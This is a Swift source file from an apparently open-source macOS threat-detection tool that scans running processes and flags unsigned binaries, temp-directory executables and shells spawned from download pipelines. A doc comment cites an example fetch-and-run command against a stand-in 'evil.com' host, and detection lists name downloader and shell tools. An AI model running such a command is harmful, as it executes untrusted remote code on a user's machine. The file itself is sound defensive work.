// MARK: - Nick
// Copyright © 2026 Ehsan Azish — github.com/EhsanAzish80
// Licensed under AGPL-3.0. See LICENSE for details.

import Foundation
import os

// MARK: - ProcessScannerError

/// Errors that `ProcessScanner` may throw.
enum ProcessScannerError: LocalizedError {
    /// `sysctl` returned an unexpected error code.
    case sysctlFailed(errno: Int32)
    /// The `proc_pidpath` call failed for a specific PID.
    case pidPathFailed(pid: Int32)

    var errorDescription: String? {
        switch self {
        case .sysctlFailed(let e):  return "sysctl(KERN_PROC_ALL) failed with errno \(e)"
        case .pidPathFailed(let p): return "proc_pidpath failed for PID \(p)"
        }
    }
}

// MARK: - ProcessScanner

/// Enumerates all running processes using the `sysctl` KERN_PROC_ALL MIB.
///
/// Path resolution uses `proc_pidpath` (libproc). Both operations are
/// available without elevated privileges for processes owned by the current user;
/// privileged process paths return an empty string, which is modelled as a
/// `.unknown` signing status.
///
/// - Note: This is a snapshot scanner — there is no continuous monitoring in Phase 1.
///         Process events via `kqueue/PROC_EVENT` are added in Phase 2.
struct ProcessScanner {

    // MARK: - Private

    private static let logger = Logger(
        subsystem: "com.ehsanazish.nick",
        category: "ProcessScanner"
    )

    /// Shell process names used to detect LOLBins run from unexpected parents.
    private static let shellProcessNames: Set<String> = [
        "bash", "sh", "zsh", "csh", "tcsh", "ksh", "fish", "dash"
    ]

    // MARK: - Public API

    /// Returns a snapshot of all currently running processes.
    ///
    /// - Returns: Array of `NickProcessInfo` for every accessible process.
    /// - Throws: `ProcessScannerError` if the initial `sysctl` call fails.
    /// Returns a snapshot of all currently running processes.
    ///
    /// - Returns: Array of `NickProcessInfo` for every accessible process.
    /// - Throws: `ProcessScannerError` if the initial `sysctl` call fails.
    func scan() throws -> [NickProcessInfo] {
        let kinfos = try fetchKinfoList()
        var result: [NickProcessInfo] = []
        result.reserveCapacity(kinfos.count)

        for kinfo in kinfos {
            if let info = buildProcessInfo(from: kinfo) {
                result.append(info)
            }
        }

        Self.logger.debug("Process scan: \(result.count) processes enumerated")
        return result
    }

    /// Returns a process snapshot immediately with all signing statuses set to `.pending`.
    ///
    /// This is the first half of the two-phase scan strategy. Callers display results
    /// right away, then call `SignatureValidator.shared.backfill(processes:onUpdate:)`
    /// to resolve signing statuses asynchronously in the background.
    ///
    /// - Returns: Process snapshot where every entry has `signingStatus == .pending`.
    /// - Throws: `ProcessScannerError` if the `sysctl` call fails.
    func scanFast() throws -> [NickProcessInfo] {
        let kinfos = try fetchKinfoList()
        var result: [NickProcessInfo] = []
        result.reserveCapacity(kinfos.count)

        for kinfo in kinfos {
            if let info = buildProcessInfo(from: kinfo, skipSigning: true) {
                result.append(info)
            }
        }

        Self.logger.debug("Fast process scan: \(result.count) processes (signing deferred)")
        return result
    }

    // MARK: - Private Helpers

    /// Calls `sysctl(CTL_KERN, KERN_PROC, KERN_PROC_ALL)` and returns the raw kinfo_proc array.
    private func fetchKinfoList() throws -> [kinfo_proc] {
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
        let stride = MemoryLayout<kinfo_proc>.stride
        var lastError: Int32 = 0

        // The process table can grow between the sizing and data calls. macOS
        // reports that race as ENOMEM. Retry with a freshly sized buffer plus
        // headroom instead of failing the entire runtime snapshot.
        for _ in 0..<5 {
            var requiredSize = 0
            guard sysctl(&mib, 4, nil, &requiredSize, nil, 0) == 0 else {
                throw ProcessScannerError.sysctlFailed(errno: errno)
            }

            let requiredCount = max(1, (requiredSize + stride - 1) / stride)
            let countWithHeadroom = requiredCount + max(16, requiredCount / 8)
            var buffer = [kinfo_proc](repeating: kinfo_proc(), count: countWithHeadroom)
            var suppliedSize = buffer.count * stride
            let status = buffer.withUnsafeMutableBytes { bytes in
                sysctl(&mib, 4, bytes.baseAddress, &suppliedSize, nil, 0)
            }
            if status == 0 {
                return Array(buffer.prefix(suppliedSize / stride))
            }

            lastError = errno
            if lastError != ENOMEM {
                throw ProcessScannerError.sysctlFailed(errno: lastError)
            }
        }

        throw ProcessScannerError.sysctlFailed(errno: lastError == 0 ? ENOMEM : lastError)
    }

    private func buildProcessInfo(from kinfo: kinfo_proc, skipSigning: Bool = false) -> NickProcessInfo? {
        let pid = kinfo.kp_proc.p_pid
        guard pid > 0 else { return nil }

        let processName = withUnsafeBytes(of: kinfo.kp_proc.p_comm) { bytes in
            let bound = bytes.bindMemory(to: CChar.self)
            return String(cString: bound.baseAddress!)
        }

        let parentPID = kinfo.kp_eproc.e_ppid

        // Resolve the binary path via proc_pidpath; empty path → privileged process
        let path = resolvePath(pid: pid)

        // Retrieve the owning user
        let uid = kinfo.kp_eproc.e_pcred.p_ruid
        let user = userName(for: uid) ?? String(uid)

        // Retrieve start time
        let startTime: Date? = {
            let tv = kinfo.kp_proc.p_starttime
            guard tv.tv_sec > 0 else { return nil }
            return Date(timeIntervalSince1970: TimeInterval(tv.tv_sec))
        }()

        let signingStatus: SigningStatus
        if skipSigning {
            signingStatus = .pending
        } else {
            signingStatus = path.isEmpty ? .unknown : SignatureValidator.shared.evaluate(binaryPath: path)
        }

        return NickProcessInfo(
            pid: pid,
            path: path,
            name: processName,
            parentPID: parentPID,
            parentName: nil, // resolved in second pass if needed
            signingStatus: signingStatus,
            metadata: ProcessMetadata(user: user, startTime: startTime)
        )
    }

    private func resolvePath(pid: Int32) -> String {
        // PROC_PIDPATHINFO_MAXSIZE = 4 * MAXPATHLEN = 4096 on all macOS versions.
        let maxSize = 4096
        var buffer = [CChar](repeating: 0, count: maxSize)
        let ret = proc_pidpath(pid, &buffer, UInt32(maxSize))
        guard ret > 0 else { return "" }
        return buffer.withUnsafeBufferPointer { bp in
            String(decoding: UnsafeRawBufferPointer(bp).prefix(while: { $0 != 0 }), as: UTF8.self)
        }
    }

    private func userName(for uid: uid_t) -> String? {
        guard let pw = getpwuid(uid), let namePtr = pw.pointee.pw_name else { return nil }
        let len = Int(strlen(namePtr))
        return namePtr.withMemoryRebound(to: UInt8.self, capacity: len + 1) { uPtr in
            String(decoding: UnsafeBufferPointer(start: uPtr, count: len), as: UTF8.self)
        }
    }

    // MARK: - Signal Generation

    /// Derives threat signals from a list of scanned processes.
    ///
    /// Detection rules:
    /// - Unsigned binary outside `/usr/`, `/System/`, `/Applications/` → `.medium`
    /// - Unsigned binary in `/tmp/`, `/var/folders/`, `/private/tmp/` → `.high`
    /// - Shell process with no terminal parent (LOLBin) → `.medium`
    ///
    /// Trust affects presentation and correlation, not signal collection. A signed,
    /// familiar application can still be compromised or execute a dangerous child.
    ///
    /// - Parameters:
    ///   - processes: Output of `scan()`.
    ///   - trustedProcessList: Allowlist of process names to suppress.
    /// - Returns: Zero or more signals derived from this snapshot.
    func signals(from processes: [NickProcessInfo],
                 trustedProcessList: TrustedProcessList = TrustedProcessList()) -> [ThreatSignal] {
        var signals: [ThreatSignal] = []
        let pidToName = Dictionary(uniqueKeysWithValues: processes.map { ($0.pid, $0.name) })

        for proc in processes {
            // Unsigned binary in temp/scratch directories → high
            if proc.signingStatus == .unsigned || proc.signingStatus == .invalid,
               isTemporaryPath(proc.path) {
                signals.append(ThreatSignal(
                    source: .process,
                    severity: .high,
                    title: "Unsigned binary in temporary directory",
                    description: "Process '\(proc.name)' (PID \(proc.pid)) is running from \(proc.path), which is a writable temporary location.",
                    context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "unsigned_temp_path"])
                ))
                continue
            }

            // Unsigned binary in non-system paths → medium
            if proc.signingStatus == .unsigned,
               !proc.path.isEmpty,
               !isSystemPath(proc.path) {
                signals.append(ThreatSignal(
                    source: .process,
                    severity: .medium,
                    title: "Unsigned binary",
                    description: "Process '\(proc.name)' (PID \(proc.pid)) is unsigned and running from \(proc.path).",
                    context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "unsigned"])
                ))
            }

            // Shell spawned without a terminal (LOLBin pattern)
            if Self.shellProcessNames.contains(proc.name.lowercased()) {
                let rawParentName = pidToName[proc.parentPID] ?? ""
                let parentName = rawParentName.lowercased()
                let hasTerminalParent = parentName.contains("terminal")
                    || parentName.contains("iterm")
                    || parentName.contains("warp")
                    || parentName.contains("ssh")
                    || parentName.contains("bash")
                    || parentName.contains("zsh")
                let hasPipeAttack = Self.hasConcurrentDownloaderSibling(proc: proc, in: processes)
                    || Self.hasPipeDownloadPattern(Self.parentCommandLine(for: proc.parentPID) ?? "")
                if hasPipeAttack {
                    // Strong evidence is never hidden merely because a familiar app
                    // launched the shell.
                    signals.append(ThreatSignal(
                        source: .process,
                        severity: .critical,
                        title: "Shell piped from download tool",
                        description: "'\(proc.name)' (PID \(proc.pid)) is running concurrently with a download tool under parent '\(rawParentName.isEmpty ? "unknown" : rawParentName)', indicating a download-to-shell pipe attack.",
                        context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "curl_pipe_shell", "parent": rawParentName])
                    ))
                } else if !hasTerminalParent {
                    signals.append(ThreatSignal(
                        source: .process,
                        severity: .medium,
                        title: "Shell spawned from non-terminal parent",
                        description: "'\(proc.name)' (PID \(proc.pid)) was spawned by '\(rawParentName.isEmpty ? "unknown" : rawParentName)' (PID \(proc.parentPID)), which is not a recognized terminal.",
                        context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "lolbin", "parent": rawParentName])
                    ))
                }
            }
        }

        return signals
    }

    // MARK: - Path Helpers

    private func isTemporaryPath(_ path: String) -> Bool {
        let lp = path.lowercased()
        return lp.hasPrefix("/tmp/")
            || lp.hasPrefix("/var/folders/")
            || lp.hasPrefix("/private/tmp/")
            || lp.hasPrefix("/private/var/folders/")
    }

    private func isSystemPath(_ path: String) -> Bool {
        path.hasPrefix("/usr/")
            || path.hasPrefix("/System/")
            || path.hasPrefix("/Applications/")
            || path.hasPrefix("/Library/Apple/")
    }

    // MARK: - Pipe-Download Detection Helpers

    /// Download tools that, when sharing a parent PID with a shell, indicate a
    /// `curl | bash` style pipeline attack.
    private static let downloaderNames: Set<String> = [
        "curl", "wget", "python3", "python", "ruby", "perl", "php"
    ]

    /// Returns `true` when a sibling process (same parent PID) is a known download
    /// tool.  Used to detect concurrent `curl | bash` pipelines in a process snapshot.
    private static func hasConcurrentDownloaderSibling(
        proc: NickProcessInfo,
        in processes: [NickProcessInfo]
    ) -> Bool {
        processes.contains {
            $0.pid != proc.pid
                && $0.parentPID == proc.parentPID
                && downloaderNames.contains($0.name.lowercased())
        }
    }

    /// Reads a process's full argv via `KERN_PROCARGS2`.
    /// Returns `nil` if the process is inaccessible (different UID, sandboxed, etc.).
    private static func parentCommandLine(for pid: Int32) -> String? {
        guard pid > 0 else { return nil }
        var mib: [Int32] = [CTL_KERN, KERN_PROCARGS2, pid]
        var size = 0
        guard sysctl(&mib, 3, nil, &size, nil, 0) == 0, size > 4 else { return nil }
        var buf = [UInt8](repeating: 0, count: size)
        guard sysctl(&mib, 3, &buf, &size, nil, 0) == 0 else { return nil }
        // First 4 bytes = argc; remaining bytes are null-terminated argument strings.
        var parts: [String] = []
        var current: [UInt8] = []
        for byte in buf.dropFirst(4) {
            if byte == 0 {
                if !current.isEmpty {
                    if let s = String(bytes: current, encoding: .utf8) { parts.append(s) }
                    current = []
                }
            } else {
                current.append(byte)
            }
        }
        if !current.isEmpty, let s = String(bytes: current, encoding: .utf8) { parts.append(s) }
        return parts.isEmpty ? nil : parts.joined(separator: " ")
    }

    /// Returns `true` when a command string contains a download-to-shell pipe pattern,
    /// e.g. `curl https://evil.com/install.sh | bash` or `bash -c 'wget ... | sh'`.
    private static func hasPipeDownloadPattern(_ cmd: String) -> Bool {
        let lower = cmd.lowercased()
        guard lower.contains("|") else { return false }
        let hasDownloader = lower.contains("curl") || lower.contains("wget")
        let hasShell = lower.range(
            of: #"\b(bash|zsh|sh|ksh|csh|fish|dash)\b"#,
            options: .regularExpression) != nil
        return hasDownloader && hasShell
    }

    // MARK: - Fast New-Process Signal Detection

    /// Derives signals only for processes whose PID was not present in the previous
    /// snapshot (`newPIDs`).
    ///
    /// Unlike `signals(from:)`, this method:
    /// - Uses path-based heuristics that fire even when `signingStatus == .pending`
    ///   (useful for the 5-second fast-check tick before code-signing completes).
    /// - Limits evaluation to `newPIDs` so long-running processes are not re-evaluated
    ///   on every tick.
    /// - Still uses the full `processes` array for parent-name resolution.
    ///
    /// - Parameters:
    ///   - processes: Current full process snapshot (provides parent-PID context).
    ///   - newPIDs: PIDs that did not appear in the previous snapshot.
    ///   - trustedProcessList: Allowlist to suppress false positives.
    /// - Returns: Signals for suspicious newly-spawned processes.
    func signalsForNewProcesses(
        all processes: [NickProcessInfo],
        newPIDs: Set<Int32>,
        trustedProcessList: TrustedProcessList = TrustedProcessList()
    ) -> [ThreatSignal] {
        guard !newPIDs.isEmpty else { return [] }
        var results: [ThreatSignal] = []
        let pidToName = Dictionary(uniqueKeysWithValues: processes.map { ($0.pid, $0.name) })

        for proc in processes where newPIDs.contains(proc.pid) {
            // Path-based temp check — fires even when signing status is .pending.
            if !proc.path.isEmpty, isTemporaryPath(proc.path) {
                results.append(ThreatSignal(
                    source: .process,
                    severity: .high,
                    title: "Process spawned from temporary directory",
                    description: "New process '\(proc.name)' (PID \(proc.pid)) appeared at \(proc.path), a writable temporary location.",
                    context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "temp_path_spawn"])
                ))
                continue
            }

            // LOLBin and pipe-download detection.
            if Self.shellProcessNames.contains(proc.name.lowercased()) {
                let rawParentName = pidToName[proc.parentPID] ?? ""
                let parentName = rawParentName.lowercased()
                let hasTerminalParent = parentName.contains("terminal")
                    || parentName.contains("iterm")
                    || parentName.contains("warp")
                    || parentName.contains("ssh")
                    || parentName.contains("bash")
                    || parentName.contains("zsh")
                let hasPipeAttack = Self.hasConcurrentDownloaderSibling(proc: proc, in: processes)
                    || Self.hasPipeDownloadPattern(Self.parentCommandLine(for: proc.parentPID) ?? "")
                if hasPipeAttack {
                    results.append(ThreatSignal(
                        source: .process,
                        severity: .critical,
                        title: "Shell piped from download tool",
                        description: "'\(proc.name)' (PID \(proc.pid)) appeared concurrently with a download tool under parent '\(rawParentName.isEmpty ? "unknown" : rawParentName)', indicating a pipe attack.",
                        context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "curl_pipe_shell", "parent": rawParentName])
                    ))
                } else if !hasTerminalParent {
                    results.append(ThreatSignal(
                        source: .process,
                        severity: .medium,
                        title: "Shell spawned from non-terminal parent",
                        description: "'\(proc.name)' (PID \(proc.pid)) was spawned by '\(rawParentName.isEmpty ? "unknown" : rawParentName)', which is not a recognized terminal.",
                        context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "lolbin", "parent": rawParentName])
                    ))
                }
            }
        }

        return results
    }

    /// Produces a signing-status signal for a process whose status was just resolved
    /// by the background backfill pass.
    ///
    /// Returns `nil` if the status is not suspicious or the process is in a system path.
    func signalFromResolved(_ proc: NickProcessInfo) -> ThreatSignal? {
        guard proc.signingStatus.isSuspicious else { return nil }
        if proc.path.isEmpty { return nil }

        if isTemporaryPath(proc.path) {
            return ThreatSignal(
                source: .process,
                severity: .high,
                title: "Unsigned binary in temporary directory",
                description: "Process '\(proc.name)' (PID \(proc.pid)) is running from \(proc.path), which is a writable temporary location.",
                context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "unsigned_temp_path", "phase": "backfill"])
            )
        }

        if !isSystemPath(proc.path) {
            return ThreatSignal(
                source: .process,
                severity: .medium,
                title: "Unsigned binary",
                description: "Process '\(proc.name)' (PID \(proc.pid)) is unsigned and running from \(proc.path).",
                context: ThreatSignalContext(processInfo: proc, metadata: ["reason": "unsigned", "phase": "backfill"])
            )
        }

        return nil
    }

    // MARK: - Fast Static Helpers

    /// Returns the set of all running PIDs using KERN_PROC_ALL.
    /// Does not resolve paths or user names — O(n) over the kinfo_proc buffer only.
    /// Suitable for the 5-second diff tick because it avoids all per-process syscalls.
    static func quickPIDList() -> Set<Int32> {
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
        var size = 0
        guard sysctl(&mib, 4, nil, &size, nil, 0) == 0, size > 0 else { return [] }
        let count = size / MemoryLayout<kinfo_proc>.stride
        var buffer = [kinfo_proc](repeating: kinfo_proc(), count: count)
        guard sysctl(&mib, 4, &buffer, &size, nil, 0) == 0 else { return [] }
        let actualCount = size / MemoryLayout<kinfo_proc>.stride
        return Set(buffer.prefix(actualCount).compactMap { k in
            let pid = k.kp_proc.p_pid
            return pid > 0 ? pid : nil
        })
    }

    /// Returns basic process info for a single PID using KERN_PROC_PID + proc_pidpath.
    /// Returns `nil` if the process has already exited or is otherwise inaccessible.
    /// Signing status is always `.pending`; use `SignatureValidator` to backfill if needed.
    static func quickInfo(pid: Int32) -> NickProcessInfo? {
        guard pid > 0 else { return nil }
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_PID, pid]
        var kinfo = kinfo_proc()
        var size = MemoryLayout<kinfo_proc>.stride
        guard sysctl(&mib, 4, &kinfo, &size, nil, 0) == 0, size > 0 else { return nil }
        guard kinfo.kp_proc.p_pid > 0 else { return nil }

        let processName = withUnsafeBytes(of: kinfo.kp_proc.p_comm) { bytes in
            let bound = bytes.bindMemory(to: CChar.self)
            return String(cString: bound.baseAddress!)
        }
        let parentPID = kinfo.kp_eproc.e_ppid

        var pathBuffer = [CChar](repeating: 0, count: 4096)
        let ret = proc_pidpath(pid, &pathBuffer, 4096)
        let path = ret > 0 ? String(cString: &pathBuffer) : ""

        let uid = kinfo.kp_eproc.e_pcred.p_ruid
        let user: String? = getpwuid(uid).flatMap { pw in
            guard let ptr = pw.pointee.pw_name else { return nil }
            return String(cString: ptr)
        }

        let startTime: Date? = {
            let tv = kinfo.kp_proc.p_starttime
            guard tv.tv_sec > 0 else { return nil }
            return Date(timeIntervalSince1970: TimeInterval(tv.tv_sec))
        }()

        let arguments = ProcessScanner.getArguments(pid: pid)

        return NickProcessInfo(
            pid: pid,
            path: path,
            name: processName,
            parentPID: parentPID,
            parentName: nil,
            signingStatus: .pending,
            metadata: ProcessMetadata(user: user, startTime: startTime, arguments: arguments)
        )
    }

    /// Returns the command-line arguments for `pid` by reading `KERN_PROCARGS2`.
    ///
    /// Parses the kernel buffer: first 4 bytes = `argc`, followed by the exec path
    /// (null-terminated), null-byte padding, then exactly `argc` argv strings.
    /// Returns `[]` when the process is inaccessible or has already exited.
    static func getArguments(pid: Int32) -> [String] {
        guard pid > 0 else { return [] }
        var mib: [Int32] = [CTL_KERN, KERN_PROCARGS2, pid]
        var size: Int = 0
        guard sysctl(&mib, 3, nil, &size, nil, 0) == 0, size > 4 else { return [] }

        var buffer = [UInt8](repeating: 0, count: size)
        guard sysctl(&mib, 3, &buffer, &size, nil, 0) == 0 else { return [] }

        let argc = buffer.withUnsafeBytes { $0.load(as: Int32.self) }
        guard argc > 0 else { return [] }

        var offset = 4
        // Skip exec path (first null-terminated string)
        while offset < size && buffer[offset] != 0 { offset += 1 }
        // Skip null padding before argv
        while offset < size && buffer[offset] == 0 { offset += 1 }

        var args: [String] = []
        for _ in 0..<argc {
            var end = offset
            while end < size && buffer[end] != 0 { end += 1 }
            if end > offset {
                args.append(String(bytes: buffer[offset..<end], encoding: .utf8) ?? "")
            }
            offset = end + 1
            if offset >= size { break }
        }
        return args
    }

    /// Returns `true` if the process with the given PID is still alive.
    ///
    /// Uses `kill(pid, 0)` — sends no signal, just checks for process existence.
    static func isRunning(pid: Int32) -> Bool {
        kill(pid, 0) == 0
    }
}
